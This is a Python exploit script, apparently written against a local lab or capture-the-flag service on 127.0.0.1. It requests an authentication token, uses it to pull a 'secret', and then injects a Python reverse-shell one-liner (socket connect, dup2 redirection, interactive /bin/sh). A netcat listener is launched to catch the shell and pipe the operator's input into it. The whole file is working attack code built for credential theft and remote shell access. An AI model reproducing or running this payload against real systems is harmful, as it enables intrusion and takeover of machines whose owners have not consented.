import socket
import re
import sys
from subprocess import PIPE, Popen
from threading import Thread

HOST = '127.0.0.1'
PORT = 3001

NC_HOST = '127.0.0.1'
NC_PORT = 5000


def get_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    return s

def send(tosend):
    s = get_socket()
    s.sendall(tosend)
    s.close()

def send_recv(tosend):
    s = get_socket()
    s.sendall(tosend)
    data = s.recv(1024)
    s.close()
    return data

def get_match(data):
    match = re.findall(r"'(.+?)'", data, re.MULTILINE)
    if match:
        return match[0]
    else:
        return False

def get_token():
    data = send_recv(b'token\n')
    # data should contain our token, so we have to parse it.
    output = data.decode("utf-8")
    key = get_match(output)
    if key:
        print("Got token! " + key)
        return key
    return False

def get_secret(token):
    data = send_recv(b'secret ' + bytes(token, "utf-8") + b'\n')
    output = data.decode("utf-8")
    return output

def enqueue_output(out):
    try:
        for line in iter(out.readline, b''):
            print(line, end="", flush=True)
    except KeyboardInterrupt:
        return

def run_command(cmd, token):
    proc = Popen(["nc", "-l", "-vvvvv", "-p", str(NC_PORT)], shell=False, stdin=PIPE, stdout=PIPE, encoding='utf-8')
    t = Thread(target=enqueue_output, args=(proc.stdout,))
    t.daemon = True
    t.start()

    send(bytes(cmd, 'utf-8') + b' ' + bytes(token, 'utf-8'))
    print("Successfully launched shell, should connect to {}:{}".format(NC_HOST, NC_PORT))
    while 1:
        try:
            line = sys.stdin.readline()
        except KeyboardInterrupt:
            t.join(2)
            proc.stdin.write("exit")
            proc.wait()
            break

        if not line:
            break

        proc.stdin.write(line)
        proc.stdin.flush()

token = get_token()
if token:
    tsecret = get_secret(token)
    if tsecret:
        print("Secret: " + tsecret)
    else:
        print("Failed to get secret.")
else:
    print("Failed to get token.")

token = get_token()
if token:
    run_command('"python -c \\\"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'' + NC_HOST + '\', ' + str(NC_PORT) + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);\\\""', token)
else:
    print("Failed to get token while running command.")

print("Closing...")